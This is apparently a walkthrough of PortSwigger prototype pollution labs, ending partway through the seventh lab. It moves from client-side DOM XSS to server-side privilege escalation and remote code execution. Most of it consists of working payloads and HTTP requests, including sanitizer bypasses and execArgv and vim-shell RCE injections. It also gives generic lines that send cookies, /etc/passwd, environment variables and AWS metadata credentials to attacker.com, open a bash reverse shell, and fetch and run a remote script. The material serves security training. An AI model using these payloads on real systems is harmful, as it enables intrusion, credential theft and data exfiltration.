# Prototype Pollution - Complete PortSwigger Lab Solutions

## Table of Contents
1. [Introduction to Prototype Pollution](#introduction)
2. [Client-Side Prototype Pollution Labs](#client-side-labs)
3. [Server-Side Prototype Pollution Labs](#server-side-labs)
4. [Exploitation Techniques](#exploitation-techniques)
5. [Detection Methods](#detection-methods)
6. [Real-World CVEs](#real-world-cves)
7. [Tools & Automation](#tools-and-automation)
8. [Prevention & Defense](#prevention-and-defense)

---

## Introduction

### What is Prototype Pollution?

Prototype pollution is a JavaScript vulnerability that allows attackers to add arbitrary properties to global object prototypes, which are then inherited by user-defined objects throughout the application. This occurs because JavaScript uses prototype-based inheritance, where all objects inherit properties from `Object.prototype`.

**Key Concepts:**
- **Prototype Chain**: JavaScript objects inherit properties from their prototype
- **`__proto__`**: Accessor property that references an object's prototype
- **`Object.prototype`**: The root of most JavaScript object inheritance chains
- **Gadgets**: Properties that when polluted lead to exploitable conditions

### Attack Requirements

Three elements must align for successful exploitation:

1. **Source**: User-controllable input that enables prototype poisoning
2. **Sink**: JavaScript functions or DOM elements that allow arbitrary code execution
3. **Gadget**: Properties passed to sinks without adequate filtering or sanitization

### Impact

- **Client-side**: DOM-based Cross-Site Scripting (XSS), privilege escalation, data theft
- **Server-side**: Remote code execution, privilege escalation, denial of service, data exfiltration

---

## Client-Side Prototype Pollution Labs

### Lab 1: DOM XSS via Client-Side Prototype Pollution

**Difficulty**: APPRENTICE
**Time**: 10-15 minutes
**Objective**: Find a prototype pollution source and use it to trigger DOM XSS

#### Vulnerability Description

This lab demonstrates the fundamental concept of prototype pollution leading to DOM XSS. The application uses query string parameters to populate `Object.prototype`, and a gadget property (`transport_url`) is used by the logging functionality to dynamically append script elements.

#### Solution

**Step 1: Identify the Pollution Source**

1. Navigate to the lab homepage
2. Test for prototype pollution by injecting a test property:
   ```
   /?__proto__[foo]=bar
   ```

3. Open browser DevTools Console
4. Check if the property was added to the prototype:
   ```javascript
   Object.prototype
   ```

5. Verify you see the `foo` property with value `bar`

**Step 2: Find the Gadget**

1. Navigate to **Sources** tab in DevTools
2. Examine the loaded JavaScript files, particularly `searchLogger.js`
3. Locate the code that uses `config.transport_url`:
   ```javascript
   let script = document.createElement('script');
   script.src = config.transport_url || '/resources/js/analytics.js';
   document.body.appendChild(script);
   ```

4. Notice that `transport_url` is undefined by default, making it exploitable via prototype pollution

**Step 3: Craft the Exploit**

1. Test gadget injection:
   ```
   /?__proto__[transport_url]=foo
   ```

2. Open **Elements** tab in DevTools
3. Verify a `<script>` tag appears with `src="foo"`

4. Deploy final XSS payload using data URL:
   ```
   /?__proto__[transport_url]=data:,alert(1);
   ```

5. Confirm `alert(1)` executes successfully
6. Lab solved! ✅

#### Alternative Method: Using DOM Invader

**Setup:**
1. Enable **DOM Invader** in Burp's built-in browser
2. Navigate to **DOM Invader** settings
3. Enable **Prototype pollution** detection
4. Reload the page

**Exploitation:**
1. DOM Invader automatically identifies pollution vectors in the query string
2. Click **Scan for gadgets**
3. DOM Invader finds the `transport_url` gadget
4. Click **Exploit** to automatically generate and execute a proof-of-concept

#### HTTP Requests

**Detection Request:**
```http
GET /?__proto__[foo]=bar HTTP/2
Host: LAB-ID.web-security-academy.net
```

**Exploitation Request:**
```http
GET /?__proto__[transport_url]=data:,alert(1); HTTP/2
Host: LAB-ID.web-security-academy.net
```

#### Key Payloads

| Purpose | Payload |
|---------|---------|
| Detection | `/?__proto__[foo]=bar` |
| Gadget Test | `/?__proto__[transport_url]=foo` |
| XSS Exploitation | `/?__proto__[transport_url]=data:,alert(1);` |

#### Common Mistakes

1. **Not checking console**: Forgetting to verify prototype pollution in the console before attempting exploitation
2. **Wrong syntax**: Using incorrect bracket notation or encoding
3. **Cache issues**: Browser caching previous responses; use hard refresh (Ctrl+Shift+R)
4. **Missing semicolon**: The data URL requires proper JavaScript syntax

#### Troubleshooting

- **Script tag doesn't appear**: Verify the `__proto__` syntax is correct in the URL
- **Alert doesn't execute**: Check that the data URL syntax is correct: `data:,alert(1);`
- **Property not in prototype**: Clear browser cache and try incognito mode
- **DevTools not showing changes**: Refresh the Elements tab after injecting the payload

---

### Lab 2: Client-Side Prototype Pollution via Browser APIs

**Difficulty**: PRACTITIONER
**Time**: 15-20 minutes
**Objective**: Bypass an attempted prototype pollution fix using browser API exploitation

#### Vulnerability Description

The developers attempted to patch a prototype pollution vulnerability by using `Object.defineProperty()` to make the `transport_url` property non-writable. However, they failed to set the `value` property in the descriptor, allowing attackers to pollute `Object.prototype` with a `value` property that gets inherited by the descriptor object.

#### Solution

**Step 1: Confirm Prototype Pollution Source**

1. Test basic prototype pollution:
   ```
   /?__proto__[foo]=bar
   ```

2. Open browser DevTools Console
3. Verify the property exists:
   ```javascript
   Object.prototype
   ```

**Step 2: Analyze the Security Implementation**

1. Navigate to **Sources** tab in DevTools
2. Examine `searchLoggerConfigurable.js`:
   ```javascript
   Object.defineProperty(config, 'transport_url', {
       configurable: false,
       writable: false
   });
   ```

3. Notice that while `writable: false` is set, the descriptor lacks a `value` property
4. This means the descriptor itself can inherit a `value` from `Object.prototype`

**Step 3: Exploit via Value Property Pollution**

1. Inject the `value` property instead of `transport_url`:
   ```
   /?__proto__[value]=data:,alert(1);
   ```

2. The polluted `value` property is inherited by the descriptor
3. This populates the script's `src` attribute with executable code
4. The alert executes automatically
5. Lab solved! ✅

#### Using DOM Invader

1. Enable DOM Invader's prototype pollution scanning
2. Reload the page
3. DOM Invader identifies the query string as a pollution vector
4. Click **Scan for gadgets**
5. Select the identified exploit and click **Exploit**

#### HTTP Requests

**Detection Request:**
```http
GET /?__proto__[foo]=bar HTTP/2
Host: LAB-ID.web-security-academy.net
```

**Exploitation Request:**
```http
GET /?__proto__[value]=data:,alert(1); HTTP/2
Host: LAB-ID.web-security-academy.net
```

#### Key Payloads

| Purpose | Payload |
|---------|---------|
| Detection | `/?__proto__[foo]=bar` |
| Bypass `defineProperty` | `/?__proto__[value]=data:,alert(1);` |

#### Browser API Exploitation Technique

**How fetch() Can Be Exploited:**

When using the `fetch()` API, options objects often have undefined properties:

```javascript
fetch('/api/data', {
    method: 'POST'
    // headers property is undefined
});
```

An attacker can pollute the `headers` property:
```
?__proto__[headers][X-Custom]=<img/src/onerror=alert(1)>
```

The polluted header gets inherited and may be reflected in responses, leading to XSS.

#### Common Mistakes

1. **Trying to pollute transport_url directly**: The protection specifically blocks this
2. **Not understanding descriptor inheritance**: The vulnerability relies on the descriptor object inheriting from `Object.prototype`
3. **Wrong property name**: Must pollute `value`, not other descriptor properties

#### Troubleshooting

- **Alert doesn't trigger**: Ensure you're polluting `value` not `transport_url`
- **Property not working**: Check that `Object.defineProperty()` is actually being called in the source code
- **Syntax errors**: Verify proper URL encoding and bracket notation

---

### Lab 3: Client-Side Prototype Pollution via Flawed Sanitization

**Difficulty**: PRACTITIONER
**Time**: 15-20 minutes
**Objective**: Bypass a non-recursive sanitization filter to achieve prototype pollution

#### Vulnerability Description

The application implements key sanitization to block `__proto__` and `constructor`, but the filter is not applied recursively. This allows attackers to bypass the blocklist by embedding dangerous keys within themselves (e.g., `__pro__proto__to__`), which after one pass of filtering becomes `__proto__`.

#### Solution

**Step 1: Test Basic Prototype Pollution (Blocked)**

1. Try standard prototype pollution vectors:
   ```
   /?__proto__[foo]=bar
   /?__proto__.foo=bar
   /?constructor.prototype.foo=bar
   ```

2. Open DevTools Console and check `Object.prototype`
3. Notice these attempts are blocked

**Step 2: Examine Sanitization Code**

1. Navigate to **Sources** tab in DevTools
2. Examine `deparamSanitized.js` and `searchLoggerFiltered.js`
3. Identify the sanitization mechanism uses a simple string replacement on individual keys
4. Notice it only runs once (non-recursive)

**Step 3: Bypass with Nested Keys**

1. Exploit the non-recursive filtering by nesting blocked strings:
   ```
   /?__pro__proto__to__[foo]=bar
   ```

2. After sanitization removes `__proto__` from the middle, it becomes:
   ```
   /?__proto__[foo]=bar
   ```

3. Verify in console that `Object.prototype.foo` now equals `"bar"`

**Step 4: Alternative Bypass for Constructor**

For `constructor` blocking, use:
```
/?constconstructorructor[protoprototypetype][foo]=bar
```

After one sanitization pass:
```
/?constructor[prototype][foo]=bar
```

**Step 5: Identify the Gadget**

1. Examine `searchLogger.js` in the Sources tab
2. Find the gadget that uses `config.transport_url`:
   ```javascript
   let script = document.createElement('script');
   script.src = config.transport_url || '/default.js';
   document.body.appendChild(script);
   ```

**Step 6: Exploit with XSS Payload**

1. Combine the bypass technique with the gadget:
   ```
   /?__pro__proto__to__[transport_url]=data:,alert(1);
   ```

2. The filter transforms this to:
   ```
   /?__proto__[transport_url]=data:,alert(1);
   ```

3. The polluted `transport_url` is used by the script creation code
4. Alert executes successfully
5. Lab solved! ✅

#### HTTP Requests

**Detection Requests:**
```http
GET /?__proto__[foo]=bar HTTP/2
Host: LAB-ID.web-security-academy.net

GET /?__pro__proto__to__[foo]=bar HTTP/2
Host: LAB-ID.web-security-academy.net
```

**Exploitation Request:**
```http
GET /?__pro__proto__to__[transport_url]=data:,alert(1); HTTP/2
Host: LAB-ID.web-security-academy.net
```

#### Key Payloads

| Purpose | Payload |
|---------|---------|
| Detect filter | `/?__proto__[foo]=bar` (blocked) |
| Bypass filter | `/?__pro__proto__to__[foo]=bar` |
| Constructor bypass | `/?constconstructorructor[protoprototypetype][foo]=bar` |
| XSS exploitation | `/?__pro__proto__to__[transport_url]=data:,alert(1);` |

#### Bypass Patterns

**Pattern 1: Split Insertion**
- Original: `__proto__`
- Bypass: `__pro__proto__to__`
- After filtering: `__proto__`

**Pattern 2: Multiple Splits**
- Original: `constructor.prototype`
- Bypass: `constconstructorructor.protoprototypetype`
- After filtering: `constructor.prototype`

**Pattern 3: Nested Combinations**
```
?__pro__proto__to__[constconstructorructor][protoprototypetype][foo]=bar
```

#### Common Mistakes

1. **Testing only basic payloads**: Not attempting bypass techniques when initial tests fail
2. **Not examining source code**: The key is understanding the non-recursive nature of the filter
3. **Wrong nesting**: Must nest the exact blocked string within itself
4. **Forgetting to verify**: Always check `Object.prototype` in console after bypass attempts

#### Troubleshooting

- **Bypass not working**: Ensure exact nesting - `__pro__proto__to__` not `__pr__proto__o__`
- **Property not appearing**: Clear cache and test in incognito mode
- **Alert not executing**: Verify the gadget code path is being reached
- **Filter behavior unclear**: Use DevTools debugger to step through sanitization code

---

### Lab 4: Client-Side Prototype Pollution in Third-Party Libraries

**Difficulty**: EXPERT
**Time**: 20-30 minutes (manual) or 5 minutes (DOM Invader)
**Objective**: Exploit prototype pollution in minified third-party library code

#### Vulnerability Description

This lab contains a DOM XSS vulnerability caused by a gadget in a third-party library. The challenge is that the library's source code is minified, making manual analysis extremely difficult. The vulnerability exploits the URL fragment string (`location.hash`) as the pollution source, and uses the `hitCallback` gadget that leads to `setTimeout()`.

#### Solution (DOM Invader - Recommended)

**Step 1: Setup DOM Invader**

1. Load the lab in Burp Suite's built-in browser
2. Navigate to **DOM Invader** settings
3. Enable **Prototype pollution** detection
4. Reload the page

**Step 2: Identify Pollution Vectors**

1. DOM Invader automatically scans for prototype pollution sources
2. Identifies two pollution vectors in the URL fragment string
3. These vectors operate through the hash portion of the URL

**Step 3: Discover Gadgets**

1. Click **Scan for gadgets** in DOM Invader
2. DOM Invader analyzes the minified third-party library
3. Locates the `hitCallback` gadget as an exploitation path
4. Identifies that it provides access to `setTimeout()` sink

**Step 4: Generate and Test Exploit**

1. DOM Invader generates a proof-of-concept payload:
   ```
   https://LAB-ID.web-security-academy.net/#__proto__[hitCallback]=alert(document.cookie)
   ```

2. Click **Exploit** to test the payload
3. Verify `alert(document.cookie)` executes

**Step 5: Deliver via Exploit Server**

1. Go to the exploit server
2. Create an HTML page that redirects to the malicious URL:
   ```html
   <script>
   location = 'https://LAB-ID.web-security-academy.net/#__proto__[hitCallback]=alert(document.cookie)';
   </script>
   ```

3. Click **Deliver exploit to victim**
4. Lab solved! ✅

#### Solution (Manual - Advanced)

**Step 1: Test for Hash-Based Pollution**

1. Navigate to:
   ```
   https://LAB-ID.web-security-academy.net/#__proto__[foo]=bar
   ```

2. Open DevTools Console
3. Check `Object.prototype.foo` - if it equals `"bar"`, pollution works

**Step 2: Analyze Third-Party Libraries**

1. Navigate to **Sources** tab
2. Identify loaded third-party libraries (often have generic names or are minified)
3. Search for common sink functions: `setTimeout`, `setInterval`, `eval`
4. Look for properties being accessed that might be undefined

**Step 3: Identify the hitCallback Gadget**

In the minified code, locate patterns like:
```javascript
// Minified example (beautified for clarity)
if (config.hitCallback) {
    setTimeout(config.hitCallback, 0);
}
```

**Step 4: Craft Exploitation URL**

1. Test the gadget:
   ```
   #__proto__[hitCallback]=alert(1)
   ```

2. URL encode for delivery:
   ```
   #__proto__[hitCallback]=alert%28document.cookie%29
   ```

#### HTTP Requests

**Exploit Delivery:**
```html
GET / HTTP/2
Host: exploit-SERVER-ID.exploit-server.net

<script>
location = 'https://LAB-ID.web-security-academy.net/#__proto__[hitCallback]=alert(document.cookie)';
</script>
```

**Target Request:**
```http
GET /#__proto__[hitCallback]=alert(document.cookie) HTTP/2
Host: LAB-ID.web-security-academy.net
```

#### Key Payloads

| Purpose | Payload |
|---------|---------|
| Detection | `#__proto__[foo]=bar` |
| Test gadget | `#__proto__[hitCallback]=alert(1)` |
| Steal cookies | `#__proto__[hitCallback]=alert(document.cookie)` |
| Exfiltrate data | `#__proto__[hitCallback]=fetch('//attacker.com?c='+document.cookie)` |

#### Third-Party Library Gadgets

**Common Libraries with Known Gadgets:**

1. **Google Analytics** (`ga.js`, `analytics.js`):
   - `hitCallback` → `setTimeout()`
   - `transport_url` → dynamic script loading

2. **jQuery**:
   - `url` in AJAX options
   - `context` in event handlers

3. **Lodash** (certain versions):
   - `constructor` property access

4. **Handlebars** (certain versions):
   - Template compilation options

#### Advanced Exploitation Techniques

**Technique 1: Data Exfiltration**
```javascript
#__proto__[hitCallback]=function(){
    fetch('https://attacker.com?data=' + encodeURIComponent(document.body.innerHTML))
}
```

**Technique 2: Chaining with Other Vulnerabilities**
```javascript
#__proto__[hitCallback]=function(){
    // Trigger CSRF
    fetch('/api/change-email', {
        method: 'POST',
        body: 'email=attacker@evil.com'
    })
}
```

#### Common Mistakes

1. **Not using DOM Invader**: Manual analysis of minified code is extremely time-consuming
2. **Testing query string instead of hash**: This lab specifically uses `location.hash`
3. **Forgetting URL encoding**: Special characters must be encoded for delivery
4. **Not testing locally first**: Always verify the exploit works before delivering to victim

#### Troubleshooting

- **DOM Invader not detecting**: Ensure prototype pollution scanning is enabled in settings
- **Gadget not executing**: Verify the third-party library is actually loaded
- **Alert not showing**: Check browser console for JavaScript errors
- **Exploit server issues**: Ensure the redirect script syntax is correct

---

## Server-Side Prototype Pollution Labs

### Lab 5: Privilege Escalation via Server-Side Prototype Pollution

**Difficulty**: PRACTITIONER
**Time**: 15-20 minutes
**Objective**: Exploit server-side prototype pollution to gain admin access and delete a user

#### Vulnerability Description

This Node.js/Express application unsafely merges user-controllable JSON input into server-side objects. By polluting `Object.prototype` with an `isAdmin` property, attackers can bypass authorization checks and gain administrative privileges.

#### Lab Credentials
- **Username**: `wiener`
- **Password**: `peter`

#### Solution

**Step 1: Identify the Vulnerable Endpoint**

1. Log in with provided credentials
2. Navigate to "My Account" page
3. Update your address (any values)
4. In Burp Proxy HTTP history, locate the request:
   ```http
   POST /my-account/change-address HTTP/2
   Host: LAB-ID.web-security-academy.net

   {"address_line_1":"123 Main St","address_line_2":"Apt 4","city":"Portland","postcode":"12345","country":"US","sessionId":"..."}
   ```

5. Note the JSON request body and JSON response
6. Send this request to Burp Repeater

**Step 2: Test for Prototype Pollution**

1. In Repeater, add a `__proto__` property to the JSON:
   ```json
   {
       "address_line_1":"123 Main St",
       "address_line_2":"Apt 4",
       "city":"Portland",
       "postcode":"12345",
       "country":"US",
       "sessionId":"...",
       "__proto__": {
           "foo":"bar"
       }
   }
   ```

2. Send the request
3. Examine the response - look for the `foo` property appearing in the response JSON
4. If `foo: "bar"` appears without an explicit `__proto__` field in the response, prototype pollution is successful

**Step 3: Identify the Privilege Escalation Gadget**

1. Examine the JSON response structure:
   ```json
   {
       "username": "wiener",
       "firstname": "Peter",
       "lastname": "Weiner",
       "address_line_1":"123 Main St",
       "address_line_2":"Apt 4",
       "city":"Portland",
       "postcode":"12345",
       "country":"US",
       "isAdmin": false,
       "foo": "bar"
   }
   ```

2. Notice the `isAdmin` property is present and set to `false`
3. This is the gadget we can exploit for privilege escalation

**Step 4: Pollute the isAdmin Property**

1. Modify the payload to pollute `isAdmin`:
   ```json
   {
       "address_line_1":"123 Main St",
       "address_line_2":"Apt 4",
       "city":"Portland",
       "postcode":"12345",
       "country":"US",
       "sessionId":"...",
       "__proto__": {
           "isAdmin": true
       }
   }
   ```

2. Send the request
3. Observe the response shows `isAdmin: true`

**Step 5: Verify Admin Access**

1. In your browser, refresh the "My Account" page
2. Notice an "Admin panel" link now appears in the interface
3. Click the link to access the admin panel

**Step 6: Complete the Objective**

1. In the admin panel, find the user "carlos"
2. Click "Delete" next to carlos's account
3. Lab solved! ✅

#### HTTP Requests

**Detection Request:**
```http
POST /my-account/change-address HTTP/2
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR_SESSION_COOKIE
Content-Type: application/json

{
    "address_line_1":"123 Main St",
    "address_line_2":"Apt 4",
    "city":"Portland",
    "postcode":"12345",
    "country":"US",
    "sessionId":"...",
    "__proto__": {
        "foo":"bar"
    }
}
```

**Detection Response:**
```http
HTTP/2 200 OK
Content-Type: application/json

{
    "username":"wiener",
    "isAdmin":false,
    "foo":"bar",
    ...
}
```

**Exploitation Request:**
```http
POST /my-account/change-address HTTP/2
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR_SESSION_COOKIE
Content-Type: application/json

{
    "address_line_1":"123 Main St",
    "address_line_2":"Apt 4",
    "city":"Portland",
    "postcode":"12345",
    "country":"US",
    "sessionId":"...",
    "__proto__": {
        "isAdmin":true
    }
}
```

**Admin Action Request:**
```http
POST /admin/delete HTTP/2
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR_SESSION_COOKIE
Content-Type: application/x-www-form-urlencoded

username=carlos
```

#### Key Payloads

| Purpose | Payload |
|---------|---------|
| Detection | `"__proto__": {"foo":"bar"}` |
| Privilege escalation | `"__proto__": {"isAdmin":true}` |

#### Detection Techniques for Server-Side PP

**Method 1: Property Reflection**
- Inject arbitrary properties via `__proto__`
- Check if they appear in response without explicit declaration
- Indicates successful prototype chain pollution

**Method 2: Status Code Override**
```json
"__proto__": {
    "status": 555
}
```
If custom status codes appear in responses, pollution is confirmed.

**Method 3: JSON Spaces Override**
```json
"__proto__": {
    "json spaces": 10
}
```
Observe increased JSON indentation in responses.

#### Common Mistakes

1. **Not using Burp Repeater**: Easier to test and modify JSON payloads
2. **Forgetting to refresh the page**: The admin panel only appears after page reload
3. **Invalid JSON syntax**: Ensure proper comma placement and bracket closure
4. **Wrong property name**: Must use `isAdmin` (case-sensitive)
5. **Not checking response**: The pollution confirmation is in the response JSON

#### Troubleshooting

- **Pollution not working**: Verify JSON syntax is valid
- **Property not appearing in response**: Check that the endpoint actually returns user properties
- **Admin panel not visible**: Hard refresh the page (Ctrl+Shift+R)
- **Delete action fails**: Ensure you're using the polluted session, not a fresh one

#### Important Warning

⚠️ **Server-Side Prototype Pollution Risks:**

When testing server-side prototype pollution:
- **Pollution persists** for the entire lifetime of the Node.js process
- Can **break application functionality** or cause denial of service
- May affect **other users** in shared environments
- Real-world testing requires extreme caution

The lab provides a restart button, but production systems lack this safety net.

---

### Lab 6: Remote Code Execution via Server-Side Prototype Pollution

**Difficulty**: EXPERT
**Time**: 25-35 minutes
**Objective**: Exploit server-side prototype pollution to achieve RCE and delete a file

#### Vulnerability Description

This Node.js application is vulnerable to prototype pollution that can be escalated to remote code execution. By polluting the `execArgv` property, attackers can inject command-line arguments into child processes, specifically using the `--eval` flag to execute arbitrary Node.js code.

#### Lab Credentials
- **Username**: `wiener`
- **Password**: `peter`

**Target**: Delete `/home/carlos/morale.txt`

#### Solution

**Step 1: Reconnaissance**

1. Log in with provided credentials
2. Navigate to the account page
3. Update your address to identify the vulnerable endpoint
4. In Burp HTTP history, locate:
   ```http
   POST /my-account/change-address HTTP/2
   ```

5. Send to Repeater

**Step 2: Confirm Prototype Pollution**

1. Test with `json spaces` property (non-destructive):
   ```json
   {
       "address_line_1":"123 Main St",
       "address_line_2":"Apt 4",
       "city":"Portland",
       "postcode":"12345",
       "country":"US",
       "sessionId":"...",
       "__proto__": {
           "json spaces": 10
       }
   }
   ```

2. Send the request
3. In the **Raw** response tab, observe increased JSON indentation
4. This confirms successful prototype pollution

**Step 3: Identify the RCE Vector**

1. In your browser, navigate to the admin panel
2. Observe the "Run maintenance jobs" feature
3. This functionality likely spawns child processes - a classic RCE vector

4. In Burp, trigger the maintenance jobs:
   ```http
   POST /admin/jobs HTTP/2
   Host: LAB-ID.web-security-academy.net
   Cookie: session=YOUR_SESSION_COOKIE
   ```

**Step 4: Test for RCE with Burp Collaborator**

1. Go to Burp menu → **Burp Collaborator client**
2. Click **Copy to clipboard** to get your unique Collaborator URL
3. In Repeater, modify the address change request with an RCE payload:
   ```json
   {
       "address_line_1":"123 Main St",
       "address_line_2":"Apt 4",
       "city":"Portland",
       "postcode":"12345",
       "country":"US",
       "sessionId":"...",
       "__proto__": {
           "execArgv": [
               "--eval=require('child_process').execSync('curl https://YOUR-COLLABORATOR-ID.oastify.com')"
           ]
       }
   }
   ```

4. Send the request
5. Trigger the maintenance jobs from the admin panel
6. In Burp Collaborator client, click **Poll now**
7. Observe DNS and HTTP interactions - this confirms RCE!

**Step 5: Delete the Target File**

1. Modify the payload to delete `/home/carlos/morale.txt`:
   ```json
   {
       "address_line_1":"123 Main St",
       "address_line_2":"Apt 4",
       "city":"Portland",
       "postcode":"12345",
       "country":"US",
       "sessionId":"...",
       "__proto__": {
           "execArgv": [
               "--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"
           ]
       }
   }
   ```

2. Send the request
3. Trigger the maintenance jobs again from the admin panel
4. Lab solved! ✅

#### HTTP Requests

**Detection Request (JSON Spaces):**
```http
POST /my-account/change-address HTTP/2
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR_SESSION_COOKIE
Content-Type: application/json

{
    "address_line_1":"123 Main St",
    "address_line_2":"Apt 4",
    "city":"Portland",
    "postcode":"12345",
    "country":"US",
    "sessionId":"...",
    "__proto__": {
        "json spaces": 10
    }
}
```

**RCE Test Request (Collaborator):**
```http
POST /my-account/change-address HTTP/2
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR_SESSION_COOKIE
Content-Type: application/json

{
    "address_line_1":"123 Main St",
    "address_line_2":"Apt 4",
    "city":"Portland",
    "postcode":"12345",
    "country":"US",
    "sessionId":"...",
    "__proto__": {
        "execArgv": [
            "--eval=require('child_process').execSync('curl https://YOUR-COLLABORATOR-ID.oastify.com')"
        ]
    }
}
```

**Exploitation Request (File Deletion):**
```http
POST /my-account/change-address HTTP/2
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR_SESSION_COOKIE
Content-Type: application/json

{
    "address_line_1":"123 Main St",
    "address_line_2":"Apt 4",
    "city":"Portland",
    "postcode":"12345",
    "country":"US",
    "sessionId":"...",
    "__proto__": {
        "execArgv": [
            "--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"
        ]
    }
}
```

**Trigger Maintenance Jobs:**
```http
POST /admin/jobs HTTP/2
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR_SESSION_COOKIE
```

#### Key Payloads

| Purpose | Payload |
|---------|---------|
| Non-destructive detection | `"__proto__": {"json spaces": 10}` |
| RCE verification (OOB) | `"__proto__": {"execArgv": ["--eval=require('child_process').execSync('curl https://COLLAB')"]}` |
| File deletion | `"__proto__": {"execArgv": ["--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"]}` |
| Reverse shell | `"__proto__": {"execArgv": ["--eval=require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/ATTACKER/PORT 0>&1\"')"]}` |

#### RCE Exploitation Techniques

**Technique 1: child_process.fork() via execArgv**

Node.js's `child_process.fork()` accepts command-line arguments via the `execArgv` property:

```javascript
const child = fork('worker.js', [], {
    execArgv: process.execArgv // Can be polluted!
});
```

**Attack Pattern:**
```json
"__proto__": {
    "execArgv": [
        "--eval=MALICIOUS_CODE"
    ]
}
```

The `--eval` flag executes arbitrary Node.js code in the child process.

**Technique 2: child_process.execSync() via shell and input**

```json
"__proto__": {
    "shell": "vim",
    "input": ":! curl https://attacker.com\n"
}
```

This technique pollutes both `shell` (sets vim as the shell) and `input` (executes vim commands).

#### Advanced RCE Payloads

**1. Data Exfiltration:**
```javascript
"--eval=require('child_process').execSync('cat /etc/passwd | curl -d @- https://attacker.com')"
```

**2. Reverse Shell:**
```javascript
"--eval=require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"')"
```

**3. Download and Execute:**
```javascript
"--eval=require('child_process').execSync('curl https://attacker.com/payload.sh | bash')"
```

**4. Environment Variable Extraction:**
```javascript
"--eval=require('child_process').execSync('env | curl -d @- https://attacker.com')"
```

**5. AWS Credentials Theft:**
```javascript
"--eval=require('child_process').execSync('curl http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name | curl -d @- https://attacker.com')"
```

#### Common Mistakes

1. **Not using Burp Collaborator**: Essential for blind RCE verification
2. **Forgetting to trigger the gadget**: Must click "Run maintenance jobs" to execute the payload
3. **Syntax errors in execArgv**: The array format and string escaping must be precise
4. **Not confirming pollution first**: Always verify non-destructive pollution before attempting RCE
5. **Testing destructive payloads immediately**: Always test with Collaborator first

#### Troubleshooting

- **No Collaborator callback**: Check firewall rules, verify Collaborator URL is correct
- **RCE not executing**: Ensure the maintenance jobs button actually triggers child processes
- **Server crash**: Use the lab restart button; in real assessments, avoid destructive tests
- **Syntax errors**: Validate JSON in a JSON validator before sending
- **Command not found**: Verify the target command exists on the system (use `which` or `command -v`)

#### Important Warnings

⚠️ **Critical Security Implications:**

1. **Persistent Pollution**: Server-side pollution affects the entire Node.js process lifetime
2. **Multi-User Impact**: Can affect all users of the application
3. **Denial of Service**: Malformed payloads can crash the server
4. **Data Loss**: Be extremely careful with destructive commands
5. **Legal Consequences**: Only test with explicit authorization and in approved environments

**Testing Best Practices:**
- Always start with non-destructive detection (JSON spaces)
- Use out-of-band techniques (Burp Collaborator) for verification
- Test file operations in safe directories first
- Document all actions taken during testing
- Have a rollback plan for production environments

---

### Lab 7: Exfiltrating Sensitive Data via Server-Side Prototype Pollution

**Difficulty**: EXPERT
**Time**: 30-40 minutes
**Objective**: Exploit server-side prototype pollution to exfiltrate a secret file's contents

#### Vulnerability Description

This Node.js application combines prototype pollution with RCE to enable data exfiltration. By polluting the `shell` and `input` properties, attackers can execute arbitrary commands via vim's command mode, allowing them to list directory contents, read files, and exfiltrate data through Burp Collaborator.

#### Lab Credentials
- **Username**: `wiener`
- **Password**: `peter`

**Objective**: Find and exfiltrate the contents of `/home/carlos/secret`

#### Solution

**Step 1: Study the Address Change Feature**

1. Log in with provided credentials
2. Navigate to "My Account" page
3. Submit an address update
4. In Burp Proxy HTTP history, find the `POST /my-account/change-address` request
5. Send to Repeater

**Step 2: Identify Prototype Pollution**

1. Test with the `json spaces` payload (non-destructive):
   ```json
   {
       "address_line_1":"123 Main St",
       "address_line_2":"Apt 4",
       "city":"Portland",
       "postcode":"12345",
       "country":"US",
       "sessionId":"...",
       "__proto__": {
           "json spaces": 10
       }
   }
   ```

2. Send the request
3. In the **Raw** response tab, observe increased JSON indentation
4. This confirms successful prototype pollution

**Step 3: Probe for Remote Code Execution**

1. Access the admin panel in your browser
2. Locate the "Run maintenance jobs" button
3. This spawns child processes for database and filesystem cleanup

4. Set up Burp Collaborator:
   - Go to Burp menu → **Burp Collaborator client**
   - Click **Copy to clipboard** to get your unique Collaborator domain

5. Test RCE with vim shell injection:
   ```json
   {
       "address_line_1":"123 Main St",
       "address_line_2":"Apt 4",
       "city":"Portland",
       "postcode":"12345",
       "country":"US",
       "sessionId":"...",
       "__proto__": {
           "shell": "vim",
           "input": ":! curl https://YOUR-COLLABORATOR-ID.oastify.com\n"
       }
   }
   ```

6. Send the request
7. Trigger maintenance jobs from the admin panel
8. In Burp Collaborator client, click **Poll now**
9. Verify HTTP and DNS interactions appear - RCE confirmed!

**Step 4: Leak Hidden File Names**

1. List the contents of carlos's home directory with base64 encoding (to avoid special character issues):
   ```json
   {
       "address_line_1":"123 Main St",
       "address_line_2":"Apt 4",
       "city":"Portland",
       "postcode":"12345",
       "country":"US",
       "sessionId":"...",
       "__proto__": {
           "shell": "vim",
           "input": ":! ls /home/carlos | base64 | curl -d @- https://YOUR-COLLABORATOR-ID.oastify.com\n"
       }
   }
   ```

2. Send the request
3. Trigger maintenance jobs
4. Poll Burp Collaborator
5. Look for HTTP POST requests containing data
6. Decode the Base64 payload:
   ```bash
   echo "BASE64_STRING" | base64 -d
   ```

7. Output reveals two items:
   ```
   node_apps
   secret
   ```

**Step 5: Exfiltrate the Secret File**

1. Read the contents of `/home/carlos/secret`:
   ```json
   {
       "address_line_1":"123 Main St",
       "address_line_2":"Apt 4",
       "city":"Portland",
       "postcode":"12345",
       "country":"US",
       "sessionId":"...",
       "__proto__": {
           "shell": "vim",
           "input": ":! cat /home/carlos/secret | base64 | curl -d @- https://YOUR-COLLABORATOR-ID.oastify.com\n"
       }
   }
   ```

2. Send the request
3. Trigger maintenance jobs again
4. Poll Burp Collaborator
5. Retrieve the HTTP POST request with the Base64-encoded secret
6. Decode the secret:
   ```bash
   echo "BASE64_SECRET" | base64 -d
   ```

**Step 6: Submit the Secret**

1. Copy the decoded secret value
